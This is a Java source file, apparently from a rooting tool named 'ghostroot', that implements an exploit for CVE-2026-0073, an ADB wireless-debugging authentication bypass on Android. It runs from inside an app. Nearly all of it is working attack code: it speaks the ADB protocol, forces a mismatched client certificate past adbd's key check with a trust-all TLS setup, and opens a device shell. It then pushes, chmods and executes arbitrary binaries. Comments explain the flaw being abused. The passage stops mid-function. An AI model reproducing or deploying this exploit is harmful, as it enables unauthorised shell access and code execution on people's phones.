package com.fuxi.ghostroot;

import java.io.IOException;
import javax.net.ssl.X509ExtendedKeyManager;
import javax.net.ssl.KeyManager;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.InetSocketAddress;
import java.net.Socket;
import java.security.KeyStore;
import java.security.SecureRandom;
import java.security.cert.X509Certificate;
import javax.net.ssl.KeyManagerFactory;
import javax.net.ssl.SSLContext;
import javax.net.ssl.SSLSocket;
import javax.net.ssl.TrustManager;
import javax.net.ssl.X509TrustManager;

/**
 * Pure-Java port of CVE-2026-0073 (ADB wireless-debug auth bypass).
 * Original C source: src/adb0073.c
 *
 * The untrusted_app SELinux domain forbids exec() of binaries inside
 * /data/app/.../lib/, so the native-executable route cannot work inside an
 * APK.  This port speaks the protocol directly over java.net + JSSE: no exec,
 * no JNI, no NDK toolchain required.
 */
final class Adb0073 {

    private static final int CMD_CNXN = 0x4e584e43;
    private static final int CMD_STLS = 0x534c5453;
    private static final int CMD_AUTH = 0x41555448;
    private static final int CMD_OPEN = 0x4e45504f;
    private static final int CMD_OKAY = 0x59414b4f;
    private static final int CMD_WRTE = 0x45545257;
    private static final int CMD_CLSE = 0x45534c43;

    private static final int ADB_VERSION = 0x01000001;
    private static final int ADB_MAXDATA = 256 * 1024;
    private static final int DELAYED_ACK_WINDOW = 32 * 1024 * 1024;

    private static final String BANNER =
            "host::features=shell_v2,cmd,stat_v2,ls_v2,fixed_push_mkdir,"
            + "openscreen_mdns,delayed_ack";

    private static final String NL = "\n";

    private final StringBuilder log = new StringBuilder();

    private void v(String s) {
        log.append(s).append('\n');
    }

    String log() {
        return log.toString();
    }

    private static void put32(byte[] b, int off, int v) {
        b[off] = (byte) (v & 0xff);
        b[off + 1] = (byte) ((v >>> 8) & 0xff);
        b[off + 2] = (byte) ((v >>> 16) & 0xff);
        b[off + 3] = (byte) ((v >>> 24) & 0xff);
    }

    private static int get32(byte[] b, int off) {
        return (b[off] & 0xff)
                | ((b[off + 1] & 0xff) << 8)
                | ((b[off + 2] & 0xff) << 16)
                | ((b[off + 3] & 0xff) << 24);
    }

    private static byte[] packPacket(int cmd, int arg0, int arg1, byte[] payload) {
        int len = payload == null ? 0 : payload.length;
        byte[] b = new byte[24 + len];
        put32(b, 0, cmd);
        put32(b, 4, arg0);
        put32(b, 8, arg1);
        put32(b, 12, len);
        int sum = 0;
        for (int i = 0; i < len; i++) sum += payload[i] & 0xff;
        put32(b, 16, sum);
        put32(b, 20, cmd ^ 0xffffffff);
        if (len > 0) System.arraycopy(payload, 0, b, 24, len);
        return b;
    }

    private static final class Pkt {
        int cmd, arg0, arg1, len, sum, magic;
        byte[] payload;
    }

    private static byte[] readFully(InputStream in, int n) throws IOException {
        byte[] b = new byte[n];
        int got = 0;
        while (got < n) {
            int r = in.read(b, got, n - got);
            if (r < 0) throw new IOException("eof " + got + "/" + n);
            got += r;
        }
        return b;
    }

    private static Pkt readPacket(InputStream in) throws IOException {
        byte[] h = readFully(in, 24);
        Pkt p = new Pkt();
        p.cmd = get32(h, 0);
        p.arg0 = get32(h, 4);
        p.arg1 = get32(h, 8);
        p.len = get32(h, 12);
        p.sum = get32(h, 16);
        p.magic = get32(h, 20);
        if (p.magic != (p.cmd ^ 0xffffffff)) throw new IOException("bad magic");
        p.payload = p.len > 0 ? readFully(in, p.len) : new byte[0];
        return p;
    }

    private static void writeAll(OutputStream out, byte[] d) throws IOException {
        out.write(d);
        out.flush();
    }

    private static String hex(int v) {
        return "0x" + Integer.toHexString(v);
    }

    /**
     * 只做「这是不是一个 ADB（adbd）端口」的判定，不建立可用会话。
     *
     * 为什么要单独做这一步：
     *   Android 上大量 App 都会监听 127.0.0.1（例如 32145 这类端口），
     *   单纯用「TCP 能不能连上」当判据会**误判成 0073 端口**。
     *   正确判据是：连上后发一个 ADB CNXN 包，看对方是否回一个**合法 ADB 包**
     *   （magic 校验通过，且 cmd ∈ {CNXN, STLS, AUTH}）。
     *   普通 App 的 socket 不会说 ADB 协议。
     *
     * @return 握手成功返回版本信息描述，失败返回 null
     */
    String probe(String host, int port) {
        Socket sock = null;
        try {
            sock = new Socket();
            sock.connect(new InetSocketAddress(host, port), 400);
            sock.setSoTimeout(700);
            sock.setTcpNoDelay(true);

            InputStream in = sock.getInputStream();
            OutputStream out = sock.getOutputStream();

            byte[] cnxn = packPacket(CMD_CNXN, ADB_VERSION, ADB_MAXDATA,
                    BANNER.getBytes("UTF-8"));
            writeAll(out, cnxn);

            Pkt p = readPacket(in);   // 内部已做 magic 校验，非法会抛 IOException
            if (p.cmd == CMD_STLS || p.cmd == CMD_CNXN || p.cmd == CMD_AUTH) {
                return "adb:" + hex(p.cmd) + " ver=" + hex(p.arg0) + " maxdata=" + p.arg1;
            }
            return null;
        } catch (Throwable t) {
            return null;
        } finally {
            try { if (sock != null) sock.close(); } catch (Throwable ignored) {}
        }
    }

    String run(String host, int port, String cmd) {
        Socket sock = null;
        SSLSocket ssl = null;
        try {
            v("[*] connect " + host + ":" + port);
            sock = new Socket();
            sock.connect(new InetSocketAddress(host, port), 5000);
            sock.setSoTimeout(15000);
            sock.setTcpNoDelay(true);
            v("[*] tcp connected");

            InputStream in = sock.getInputStream();
            OutputStream out = sock.getOutputStream();

            byte[] cnxn = packPacket(CMD_CNXN, ADB_VERSION, ADB_MAXDATA,
                    BANNER.getBytes("UTF-8"));
            writeAll(out, cnxn);
            v("[*] sent CNXN");

            int stlsVersion = 0;
            boolean gotStls = false;
            for (int i = 0; i < 4 && !gotStls; i++) {
                Pkt p = readPacket(in);
                v("  <- cmd=" + hex(p.cmd) + " arg0=" + hex(p.arg0) + " len=" + p.len);
                if (p.cmd == CMD_STLS) {
                    stlsVersion = p.arg0;
                    gotStls = true;
                } else if (p.cmd == CMD_CNXN) {
                    continue;
                } else if (p.cmd == CMD_AUTH) {
                    v("[-] device asked for AUTH, not wireless-debug TLS path");
                    return null;
                } else {
                    v("[-] unexpected cmd " + hex(p.cmd));
                    return null;
                }
            }
            if (!gotStls) {
                v("[-] no STLS received");
                return null;
            }
            v("[+] STLS v=" + hex(stlsVersion));
            writeAll(out, packPacket(CMD_STLS, stlsVersion, 0, null));

            ssl = upgradeTls(sock);
            if (ssl == null) {
                v("[-] TLS upgrade failed");
                return null;
            }
            v("[+] TLS ok: " + ssl.getSession().getProtocol()
                    + " / " + ssl.getSession().getCipherSuite());

            InputStream sin = ssl.getInputStream();
            OutputStream sout = ssl.getOutputStream();

            boolean gotCnxn = false;
            for (int i = 0; i < 8 && !gotCnxn; i++) {
                Pkt p = readPacket(sin);
                v("  <- (tls) cmd=" + hex(p.cmd) + " len=" + p.len);
                if (p.cmd == CMD_CNXN) gotCnxn = true;
                else if (p.cmd == CMD_STLS) continue;
                else break;
            }
            if (!gotCnxn) v("[!] warning: no post-TLS CNXN, continuing");

            final int localId = 1;
            byte[] pl = ("shell:" + cmd + "\u0000").getBytes("UTF-8");
            writeAll(sout, packPacket(CMD_OPEN, localId, DELAYED_ACK_WINDOW, pl));
            v("[*] sent OPEN shell:" + cmd);

            int remoteId = 0;
            boolean gotOk = false;
            for (int i = 0; i < 16 && !gotOk; i++) {
                Pkt p = readPacket(sin);
                if (p.cmd == CMD_STLS) continue;
                v("  <- cmd=" + hex(p.cmd) + " arg0=" + p.arg0);
                if (p.cmd == CMD_OKAY) {
                    remoteId = p.arg0;
                    gotOk = true;
                } else if (p.cmd == CMD_CLSE) {
                    v("[-] OPEN rejected (CLSE)");
                    return null;
                } else {
                    break;
                }
            }
            if (!gotOk) {
                v("[-] no OKAY after OPEN");
                return null;
            }
            writeAll(sout, packPacket(CMD_OKAY, localId, remoteId, null));

            StringBuilder sb = new StringBuilder();
            for (;;) {
                Pkt p;
                try {
                    p = readPacket(sin);
                } catch (IOException e) {
                    break;
                }
                if (p.cmd == CMD_WRTE) {
                    sb.append(new String(p.payload, "UTF-8"));
                    writeAll(sout, packPacket(CMD_OKAY, localId, remoteId, null));
                } else if (p.cmd == CMD_CLSE) {
                    break;
                } else if (p.cmd == CMD_OKAY) {
                    continue;
                } else {
                    break;
                }
            }

            String result = sb.toString();
            v("[+] output " + result.length() + " chars");
            return result;

        } catch (Throwable t) {
            v("[-] exception: " + t);
            return null;
        } finally {
            try {
                if (ssl != null) ssl.close();
            } catch (Throwable ignored) {
            }
            try {
                if (sock != null) sock.close();
            } catch (Throwable ignored) {
            }
        }
    }

    private SSLSocket upgradeTls(Socket sock) {
        try {
            final KeyStore ks = SelfSignedCert.getKeyStore();
            String alias = ks.aliases().nextElement();
            v("[*] client cert alias=" + alias);

            KeyManagerFactory kmf = KeyManagerFactory.getInstance(
                    KeyManagerFactory.getDefaultAlgorithm());
            kmf.init(ks, "x".toCharArray());
            // JSSE's default key manager refuses to hand out an EC client cert
            // when the server's CertificateRequest only advertises RSA.  adbd
            // in this codepath does exactly that, so wrap the real manager and
            // force our alias to always be chosen.
            final X509ExtendedKeyManager inner =
                    (X509ExtendedKeyManager) kmf.getKeyManagers()[0];
            final X509ExtendedKeyManager forced = new X509ExtendedKeyManager() {
                public String chooseClientAlias(String[] kt, java.security.Principal[] i, Socket s) {
                    return alias;
                }
                public String chooseServerAlias(String kt, java.security.Principal[] i, Socket s) {
                    return inner.chooseServerAlias(kt, i, s);
                }
                public X509Certificate[] getCertificateChain(String a) {
                    return inner.getCertificateChain(a);
                }
                public java.security.PrivateKey getPrivateKey(String a) {
                    return inner.getPrivateKey(a);
                }
                public String[] getClientAliases(String kt, java.security.Principal[] i) {
                    return inner.getClientAliases(kt, i);
                }
                public String[] getServerAliases(String kt, java.security.Principal[] i) {
                    return inner.getServerAliases(kt, i);
                }
            };

            final TrustManager[] tms = new TrustManager[]{new X509TrustManager() {
                public void checkClientTrusted(X509Certificate[] c, String a) {
                }

                public void checkServerTrusted(X509Certificate[] c, String a) {
                }

                public X509Certificate[] getAcceptedIssuers() {
                    return new X509Certificate[0];
                }
            }};

            SSLContext ctx = SSLContext.getInstance("TLS");
            ctx.init(new KeyManager[]{forced}, tms, new SecureRandom());
            SSLSocket s = (SSLSocket) ctx.getSocketFactory().createSocket(
                    sock, sock.getInetAddress().getHostAddress(),
                    sock.getPort(), true);
            s.setEnabledProtocols(new String[]{"TLSv1.3"});
            s.setUseClientMode(true);
            s.startHandshake();
            return s;
        } catch (Throwable t) {
            String msg = String.valueOf(t);
            // CVE-2026-0073 的触发前提：/data/misc/adb/adb_keys 里至少要有一把
            // 非 EC 类型的公钥（通常是 RSA）。AOSP 的判断漏了 "== 1"，只要
            // EVP_PKEY_cmp 返回 -1（类型不同）就算认证通过。若 adb_keys 为空，
            // 这把"类型不匹配"的戏就演不成，adbd 直接回 CERTIFICATE_UNKNOWN。
            if (msg.contains("CERTIFICATE_UNKNOWN")
                    || msg.contains("certificate_unknown")
                    || msg.contains("SSLV3_ALERT")) {
                v("[!] 提示: adbd 拒绝了客户端证书（CERTIFICATE_UNKNOWN）");
                v("[!] 原因: 本机 /data/misc/adb/adb_keys 里没有可用于触发漏洞的公钥");
                v("[!] 解决: 打开 开发者选项 -> 无线调试 -> 使用配对码配对一次");
                v("[!]       或启动一次 Shizuku(ADB 模式)，然后重试本工具");
            } else {
                v("[-] TLS handshake failed: " + t);
            }
            return null;
        }
    }

    String pushAndRun(String host, int port, byte[] data, String remotePath,
                      String args) {
        java.util.Base64.Encoder enc = java.util.Base64.getEncoder();
        StringBuilder sb = new StringBuilder();
        sb.append("rm -f ").append(remotePath).append(".b64").append(NL);

        final int batch = 24 * 1024;
        int n = 0;
        for (int off = 0; off < data.length; off += batch) {
            int end = Math.min(off + batch, data.length);
            String chunk = enc.encodeToString(
                    java.util.Arrays.copyOfRange(data, off, end));
            sb.append("echo ").append(chunk).append(" >> ")
                    .append(remotePath).append(".b64").append(NL);
            n++;
            if (n % 8 == 0) sb.append("echo GRMK").append(n).append(NL);
        }
        sb.append("echo GRMK").append(n).append(NL);
        sb.append("base64 -d ").append(remotePath).append(".b64 > ")
                .append(remotePath).append(NL);
        sb.append("chmod 755 ").append(remotePath).append(NL);
        sb.append("rm -f ").append(remotePath).append(".b64").append(NL);
        sb.append(remotePath).append(" ").append(args).append(NL);
        sb.append("echo GREOF_MARKER").append(NL);
        return run(host, port, sb.toString());
    }


    /* ------------------------------------------------------------------ */
    /* interactive push: batched writes over ONE shell session             */
    /* ------------------------------------------------------------------ */

    /**
     * Push a file through the 0073 shell channel WITHOUT ever sending the whole
     * payload as a single command line.  A shell command line is capped by the
     * kernel at MAX_ARG_STRLEN (128 KB), so a multi-megabyte base64 blob can
     * never be handed to sh -c in one go.  Instead we open the shell once and
     * dribble the payload in, waiting for a marker echo between batches.
     *
     * @return accumulated device stdout (includes the markers), or null.
     */
    String runStdin(String host, int port, byte[] data, String remotePath) {
        Socket sock = null;
        SSLSocket ssl = null;
        try {
            v("[*] connect " + host + ":" + port);
            sock = new Socket();
            sock.connect(new InetSocketAddress(host, port), 5000);
            sock.setSoTimeout(15000);
            sock.setTcpNoDelay(true);

            InputStream in = sock.getInputStream();
            OutputStream out = sock.getOutputStream();

            writeAll(out, packPacket(CMD_CNXN, ADB_VERSION, ADB_MAXDATA,
                    BANNER.getBytes("UTF-8")));
            int stlsVersion = 0;
            boolean gotStls = false;
            for (int i = 0; i < 4 && !gotStls; i++) {
                Pkt p = readPacket(in);
                if (p.cmd == CMD_STLS) {
                    stlsVersion = p.arg0;
                    gotStls = true;
                } else if (p.cmd == CMD_CNXN) {
                    continue;
                } else if (p.cmd == CMD_AUTH) {
                    v("[-] AUTH requested");
                    return null;
                } else {
                    v("[-] unexpected " + hex(p.cmd));
                    return null;
                }
            }
            if (!gotStls) {
                v("[-] no STLS");
                return null;
            }
            writeAll(out, packPacket(CMD_STLS, stlsVersion, 0, null));

            ssl = upgradeTls(sock);
            if (ssl == null) {
                v("[-] TLS failed");
                return null;
            }
            InputStream sin = ssl.getInputStream();
            OutputStream sout = ssl.getOutputStream();

            boolean gotCnxn = false;
            for (int i = 0; i < 8 && !gotCnxn; i++) {
                Pkt p = readPacket(sin);
                if (p.cmd == CMD_CNXN) gotCnxn = true;
                else if (p.cmd == CMD_STLS) continue;
                else break;
            }

            /* open an interactive shell (no command) */
            final int localId = 1;
            byte[] pl = "shell:".getBytes("UTF-8");
            writeAll(sout, packPacket(CMD_OPEN, localId, DELAYED_ACK_WINDOW, pl));

            int remoteId = 0;
            boolean gotOk = false;
            for (int i = 0; i < 16 && !gotOk; i++) {
                Pkt p = readPacket(sin);
                if (p.cmd == CMD_STLS) continue;
                if (p.cmd == CMD_OKAY) {
                    remoteId = p.arg0;
                    gotOk = true;
                } else if (p.cmd == CMD_CLSE) {
                    v("[-] shell OPEN rejected");
                    return null;
                } else {
                    break;
                }
            }
            if (!gotOk) {
                v("[-] no OKAY for shell");
                return null;
            }
            writeAll(sout, packPacket(CMD_OKAY, localId, remoteId, null));
            v("[+] interactive shell open (remote id=" + remoteId + ")");

            StringBuilder all = new StringBuilder();
            long deadline = System.currentTimeMillis() + 600000L;

            /* helper: send text as WRTE */
            String header = "rm -f " + remotePath + ".b64; : > " + remotePath + ".b64" + NL;
            writeAll(sout, packPacket(CMD_WRTE, localId, remoteId,
                    header.getBytes("UTF-8")));

            java.util.Base64.Encoder enc = java.util.Base64.getEncoder();
            final int CHUNK = 1024;
            int batchNo = 0;
            int total = 0;

            for (int off = 0; off < data.length; off += CHUNK) {
                if (System.currentTimeMillis() > deadline) {
                    v("[-] timeout during push at " + off + "/" + data.length);
                    return null;
                }
                int end = Math.min(off + CHUNK, data.length);
                String b64 = enc.encodeToString(
                        java.util.Arrays.copyOfRange(data, off, end));
                String line = "printf %s " + b64 + " >> " + remotePath + ".b64" + NL;
                writeAll(sout, packPacket(CMD_WRTE, localId, remoteId,
                        line.getBytes("UTF-8")));
                batchNo++;
                total += (end - off);

                /* after every 4 chunks, demand a marker and read until we see it */
                if (true) {
                    String mk = "GRMK" + batchNo;
                    writeAll(sout, packPacket(CMD_WRTE, localId, remoteId,
                            ("echo " + mk + NL).getBytes("UTF-8")));
                    if (!readUntil(sin, sout, localId, remoteId, mk, all, 20000L)) {
                        v("[-] marker " + mk + " not seen after batch " + batchNo);
                        return null;
                    }
                    v("[*] pushed " + total + "/" + data.length + " bytes");
                }
            }

            /* restore + finish */
            String tail = "base64 -d " + remotePath + ".b64 > " + remotePath + NL
                    + "chmod 755 " + remotePath + NL
                    + "rm -f " + remotePath + ".b64" + NL
                    + "echo GRDONE" + NL;
            writeAll(sout, packPacket(CMD_WRTE, localId, remoteId,
                    tail.getBytes("UTF-8")));
            readUntil(sin, sout, localId, remoteId, "GRDONE", all, 60000L);

            v("[+] push done, " + total + " bytes staged at " + remotePath);
            return all.toString();

        } catch (Throwable t) {
            v("[-] runStdin exception: " + t);
            return null;
        } finally {
            try {
                if (ssl != null) ssl.close();
            } catch (Throwable ignored) {
            }
            try {
                if (sock != null) sock.close();
            } catch (Throwable ignored) {
            }
        }
    }

    /**
     * Pump the shell stream until the marker text shows up, ACKing WRTE packets
     * on the way.  Anything received is appended to out.
     */
    /**
     * Pump the shell stream until *marker* shows up, ACKing WRTE packets on the
     * way.  Only a small sliding window is kept so the (very chatty) shell echo
     * of the payload cannot balloon the heap; *sink* still receives a bounded
     * tail so callers can inspect the last thing the device said.
     */
    private boolean readUntil(InputStream sin, OutputStream sout, int localId,
                              int remoteId, String marker, StringBuilder sink,
                              long timeoutMs) throws IOException {
        long deadline = System.currentTimeMillis() + timeoutMs;
        StringBuilder win = new StringBuilder();
        while (System.currentTimeMillis() < deadline) {
            Pkt p = readPacket(sin);
            if (p.cmd == CMD_WRTE) {
                String chunk = new String(p.payload, "UTF-8");
                win.append(chunk);
                if (win.length() > 16384) {
                    win.delete(0, win.length() - 16384);
                }
                sink.append(chunk);
                if (sink.length() > 16384) {
                    sink.delete(0, sink.length() - 16384);
                }
                writeAll(sout, packPacket(CMD_OKAY, localId, remoteId, null));
            } else if (p.cmd == CMD_CLSE) {
                break;
            } else if (p.cmd == CMD_OKAY) {
                continue;
            } else {
                break;
            }
            if (win.indexOf(marker) >= 0) {
                return true;
            }
        }
        return win.indexOf(marker) >= 0;
    }

    /* ------------------------------------------------------------------ */
    /* real adb push: speak the SYNC sub-protocol over "sync:"             */
    /* ------------------------------------------------------------------ */
    /**
     * Push *data* to *remotePath* using adbd's SYNC service (the very same
     * transport `adb push` uses).  This completely sidesteps the interactive
     * shell, its pty line buffer and MAX_ARG_STRLEN, so arbitrarily large
     * payloads work.
     *
     * Protocol (all integers little-endian):
     *   SEND <pathLen> <path> <mode>     -> OKAY
     *   DATA <len> <bytes>               -> OKAY   (repeat)
     *   DONE <mtime>                     -> OKAY
     *   QUIT <0>
     *
     * @return true on success.
     */
    boolean pushSync(String host, int port, byte[] data, String remotePath) {
        Socket sock = null;
        SSLSocket ssl = null;
        try {
            sock = new Socket();
            sock.connect(new InetSocketAddress(host, port), 5000);
            sock.setSoTimeout(30000);
            sock.setTcpNoDelay(true);
            InputStream in = sock.getInputStream();
            OutputStream out = sock.getOutputStream();

            writeAll(out, packPacket(CMD_CNXN, ADB_VERSION, ADB_MAXDATA,
                    BANNER.getBytes("UTF-8")));
            int stlsVersion = 0;
            boolean gotStls = false;
            for (int i = 0; i < 4 && !gotStls; i++) {
                Pkt p = readPacket(in);
                if (p.cmd == CMD_STLS) {
                    stlsVersion = p.arg0;
                    gotStls = true;
                } else if (p.cmd == CMD_CNXN) {
                    continue;
                } else if (p.cmd == CMD_AUTH) {
                    v("[-] AUTH requested");
                    return false;
                } else {
                    v("[-] unexpected " + hex(p.cmd));
                    return false;
                }
            }
            if (!gotStls) {
                v("[-] no STLS");
                return false;
            }
            writeAll(out, packPacket(CMD_STLS, stlsVersion, 0, null));
            ssl = upgradeTls(sock);
            if (ssl == null) {
                v("[-] TLS failed");
                return false;
            }
            InputStream sin = ssl.getInputStream();
            OutputStream sout = ssl.getOutputStream();

            boolean gotCnxn = false;
            for (int i = 0; i < 8 && !gotCnxn; i++) {
                Pkt p = readPacket(sin);
                if (p.cmd == CMD_CNXN) gotCnxn = true;
                else if (p.cmd == CMD_STLS) continue;
                else break;
            }

            final int localId = 1;
            writeAll(sout, packPacket(CMD_OPEN, localId, DELAYED_ACK_WINDOW,
                    "sync:\u0000".getBytes("UTF-8")));
            int remoteId = 0;
            boolean gotOk = false;
            for (int i = 0; i < 16 && !gotOk; i++) {
                Pkt p = readPacket(sin);
                if (p.cmd == CMD_STLS) continue;
                if (p.cmd == CMD_OKAY) {
                    remoteId = p.arg0;
                    gotOk = true;
                } else if (p.cmd == CMD_CLSE) {
                    v("[-] sync OPEN rejected");
                    return false;
                } else {
                    break;
                }
            }
            if (!gotOk) {
                v("[-] no OKAY for sync:");
                return false;
            }
            writeAll(sout, packPacket(CMD_OKAY, localId, remoteId, null));
            v("[+] sync session open (remote id=" + remoteId + ")");

            /* ---- SEND ---- */
            byte[] pathB = remotePath.getBytes("UTF-8");
            java.io.ByteArrayOutputStream h = new java.io.ByteArrayOutputStream();
            h.write("SEND".getBytes("US-ASCII"));
            writeLE32(h, pathB.length);
            h.write(pathB);
            writeLE32(h, 0755);
            byte[] sendReq = h.toByteArray();
            StringBuilder hx = new StringBuilder();
            for (int k = 0; k < sendReq.length; k++) {
                hx.append(String.format("%02x", sendReq[k] & 0xff));
                if (k + 1 < sendReq.length) hx.append(" ");
            }
            v("[*] SEND frame (" + sendReq.length + " B): " + hx);
            if (!syncWrite(sin, sout, localId, remoteId, sendReq)) {
                v("[-] SEND not accepted");
                return false;
            }
            v("[*] SEND " + remotePath + " (" + data.length + " bytes)");

            /* ---- DATA blocks ---- */
            final int BLK = 32 * 1024;
            int sent = 0;
            while (sent < data.length) {
                int n = Math.min(BLK, data.length - sent);
                java.io.ByteArrayOutputStream db = new java.io.ByteArrayOutputStream();
                db.write("DATA".getBytes("US-ASCII"));
                writeLE32(db, n);
                db.write(data, sent, n);
                if (!syncWrite(sin, sout, localId, remoteId, db.toByteArray())) {
                    v("[-] DATA rejected at offset " + sent);
                    return false;
                }
                sent += n;
                if (sent % (256 * 1024) == 0 || sent == data.length) {
                    v("[*] sync " + sent + "/" + data.length);
                }
            }

            /* ---- DONE ---- */
            java.io.ByteArrayOutputStream dn = new java.io.ByteArrayOutputStream();
            dn.write("DONE".getBytes("US-ASCII"));
            writeLE32(dn, (int) (System.currentTimeMillis() / 1000L));
            if (!syncWrite(sin, sout, localId, remoteId, dn.toByteArray())) {
                v("[-] DONE not accepted");
                return false;
            }

            /* ---- QUIT (best effort) ---- */
            java.io.ByteArrayOutputStream qt = new java.io.ByteArrayOutputStream();
            qt.write("QUIT".getBytes("US-ASCII"));
            writeLE32(qt, 0);
            try {
                syncWrite(sin, sout, localId, remoteId, qt.toByteArray());
            } catch (Throwable ignored) {
            }
            v("[+] sync push complete: " + sent + " bytes -> " + remotePath);
            return true;
        } catch (Throwable t) {
            v("[-] pushSync exception: " + t);
            return false;
        } finally {
            try {
                if (ssl != null) ssl.close();
            } catch (Throwable ignored) {
            }
            try {
                if (sock != null) sock.close();
            } catch (Throwable ignored) {
            }
        }
    }

    private static void writeLE32(java.io.ByteArrayOutputStream o, int v) {
        o.write(v & 0xff);
        o.write((v >> 8) & 0xff);
        o.write((v >> 16) & 0xff);
        o.write((v >> 24) & 0xff);
    }

    /** Wrap a SYNC request in a WRTE packet and wait for adbd's OKAY. */
    /**
     * Send one SYNC request and wait for the SYNC-level answer.
     *
     * Two protocol layers share this stream:
     *   - the ADB layer ACKs our WRTE with CMD_OKAY (may or may not arrive),
     *   - the SYNC layer replies with a CMD_WRTE carrying "OKAY" or "FAIL".
     * Ignoring that distinction makes the ADB-layer ACK look like a success and
     * leaves the real FAIL to be misread by the *next* request.
     */
    private boolean syncWrite(InputStream sin, OutputStream sout, int localId,
                              int remoteId, byte[] req) throws IOException {
        writeAll(sout, packPacket(CMD_WRTE, localId, remoteId, req));
        for (int i = 0; i < 64; i++) {
            Pkt p = readPacket(sin);
            if (p.cmd == CMD_OKAY) {
                /* ADB-layer ACK for our WRTE -- keep waiting for SYNC's reply */
                continue;
            } else if (p.cmd == CMD_WRTE) {
                String m = new String(p.payload, "UTF-8");
                writeAll(sout, packPacket(CMD_OKAY, localId, remoteId, null));
                if (m.startsWith("OKAY")) {
                    return true;
                }
                v("[*] sync says: " + m.replace("\n", " ") + " (len=" + p.payload.length + ")");
                return false;
            } else if (p.cmd == CMD_CLSE) {
                v("[-] sync stream closed");
                return false;
            } else {
                v("[-] sync unexpected " + hex(p.cmd));
                return false;
            }
        }
        v("[-] sync reply timeout");
        return false;
    }

    /* ------------------------------------------------------------------ */
    /* push over a RAW (no-pty) shell -- no 4 KB canonical line buffer      */
    /* ------------------------------------------------------------------ */
    /**
     * Push *data* by piping it into a raw (non-pty) shell session.
     *
     * The interactive `shell:` service allocates a pty in canonical mode, whose
     * line buffer is ~4 KB -- any longer line is silently truncated.  `shell,raw:`
     * is the pty-less variant: stdin is a plain pipe into the shell, so we can
     * shove in a base64 stream of any size in large chunks without loss.
     *
     * Remote side does:  base64 -d > <remotePath>   (plus chmod / size echo)
     *
     * @return accumulated device stdout, or null.
     */
    String pushRaw(String host, int port, byte[] data, String remotePath) {
        Socket sock = null;
        SSLSocket ssl = null;
        try {
            sock = new Socket();
            sock.connect(new InetSocketAddress(host, port), 5000);
            sock.setSoTimeout(30000);
            sock.setTcpNoDelay(true);
            InputStream in = sock.getInputStream();
            OutputStream out = sock.getOutputStream();

            writeAll(out, packPacket(CMD_CNXN, ADB_VERSION, ADB_MAXDATA,
                    BANNER.getBytes("UTF-8")));
            int stlsVersion = 0;
            boolean gotStls = false;
            for (int i = 0; i < 4 && !gotStls; i++) {
                Pkt p = readPacket(in);
                if (p.cmd == CMD_STLS) {
                    stlsVersion = p.arg0;
                    gotStls = true;
                } else if (p.cmd == CMD_CNXN) {
                    continue;
                } else if (p.cmd == CMD_AUTH) {
                    v("[-] AUTH requested");
                    return null;
                } else {
                    v("[-] unexpected " + hex(p.cmd));
                    return null;
                }
            }
            if (!gotStls) {
                v("[-] no STLS");
                return null;
            }
            writeAll(out, packPacket(CMD_STLS, stlsVersion, 0, null));
            ssl = upgradeTls(sock);
            if (ssl == null) {
                v("[-] TLS failed");
                return null;
            }
            InputStream sin = ssl.getInputStream();
            OutputStream sout = ssl.getOutputStream();

            boolean gotCnxn = false;
            for (int i = 0; i < 8 && !gotCnxn; i++) {
                Pkt p = readPacket(sin);
                if (p.cmd == CMD_CNXN) gotCnxn = true;
                else if (p.cmd == CMD_STLS) continue;
                else break;
            }

            /* raw shell, no pty: this is the whole point */
            final int localId = 1;
            String svc = "shell,raw:base64 -d > " + remotePath + "; chmod 755 " + remotePath + "; ls -l " + remotePath + "; echo SZSIZE; echo GHDONE";
            writeAll(sout, packPacket(CMD_OPEN, localId, DELAYED_ACK_WINDOW,
                    (svc + "\u0000").getBytes("UTF-8")));
            int remoteId = 0;
            boolean gotOk = false;
            for (int i = 0; i < 16 && !gotOk; i++) {
                Pkt p = readPacket(sin);
                if (p.cmd == CMD_STLS) continue;
                if (p.cmd == CMD_OKAY) {
                    remoteId = p.arg0;
                    gotOk = true;
                } else if (p.cmd == CMD_CLSE) {
                    v("[-] raw shell OPEN rejected (CLSE)");
                    return null;
                } else {
                    v("[-] OPEN " + hex(p.cmd));
                    break;
                }
            }
            if (!gotOk) {
                v("[-] no OKAY for " + svc);
                return null;
            }
            writeAll(sout, packPacket(CMD_OKAY, localId, remoteId, null));
            v("[+] raw shell open (remote id=" + remoteId + ")");

            StringBuilder sink = new StringBuilder();

            /* Encode the WHOLE payload once, then slice the resulting text.
             * Encoding per-chunk would put a base64 padding character ('=') in
             * the middle of the stream, which makes `base64 -d` abort after the
             * first chunk -- leaving a suspiciously round 65536-byte file. */
            final int CHUNK = 64 * 1024;
            String all = java.util.Base64.getEncoder().encodeToString(data);
            v("[*] base64 stream = " + all.length() + " chars");
            int batch = 0;
            long deadline = System.currentTimeMillis() + 600000L;
            for (int off = 0; off < all.length(); off += CHUNK) {
                if (System.currentTimeMillis() > deadline) {
                    v("[-] timeout at " + off + "/" + all.length());
                    return null;
                }
                int end = Math.min(off + CHUNK, all.length());
                writeAll(sout, packPacket(CMD_WRTE, localId, remoteId,
                        all.substring(off, end).getBytes("UTF-8")));
                batch++;
                /* drain whatever adbd pushed back (ACKs / shell output) */
                drain(sin, sout, localId, remoteId, sink);
                if (batch % 4 == 0) {
                    v("[*] raw fed " + end + "/" + all.length() + " b64 chars");
                }
            }
            v("[*] raw fed " + all.length() + "/" + all.length() + " b64 chars");
            v("[*] payload " + data.length + " raw bytes");


            /* Terminate the stream and give the remote end time to finish.
             *
             * CMD_CLSE alone makes adbd reap the shell.  If we close the TLS
             * socket immediately after, the last ~117 KB that base64 -d had
             * buffered never reaches the file.  So: flush, ACK-drain, close
             * the stream, then KEEP READING until the remote goes quiet.
             * Only then tear the socket down. */
            try { sout.flush(); } catch (Throwable ignored) { }
            for (int i = 0; i < 3; i++) {
                drain(sin, sout, localId, remoteId, sink);
            }
            /* Do NOT send CMD_CLSE: adbd answers it by SIGKILLing the shell,
             * and a killed `base64 -d` loses whatever it still had buffered
             * (~117 KB in practice).  Instead shut down only the TLS write
             * direction: the remote shell sees EOF on stdin, `base64 -d`
             * finishes cleanly and flushes the file, then the chmod/ls/echo
             * output comes back on the read half. */
            try {
                ssl.shutdownOutput();
            } catch (Throwable t1) {
                v("[-] shutdownOutput failed: " + t1);
                try {
                    writeAll(sout, packPacket(CMD_CLSE, localId, remoteId, null));
                } catch (Throwable ignored) { }
            }
            try { sout.flush(); } catch (Throwable ignored) { }

            int idle = 0;
            try {
                sock.setSoTimeout(8000);
